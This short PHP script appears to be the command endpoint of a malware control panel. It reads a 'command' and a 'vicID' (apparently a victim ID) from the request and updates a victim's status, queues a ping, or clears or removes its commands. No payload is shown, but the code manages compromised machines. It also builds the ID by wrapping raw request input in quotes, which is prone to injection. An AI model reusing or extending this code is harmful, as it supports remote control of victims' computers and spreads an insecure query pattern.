<?php
include 'classes/Database.php';
include 'classes/Clients.php';
$client = new Clients;
$_GET   = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
$command = $_GET['command'];
$ID = "'".$_GET['vicID']."'";
switch ($command) {
	case "Uninstall":
          $client->removeCommands($ID);           
		break;

	case "CleanCommands":
          $client->updateCommands($ID,"Ping");
		break;
		
	case "Offline":
          $client->updateStatus($ID,"Offline");
		break;

	case "Online":
		  $client->updateStatus($ID,"Online");
		break;
		
	case 'Ping':
		$client->updateCommands($ID,"Ping");
		break;

	default:
		break;
}
?>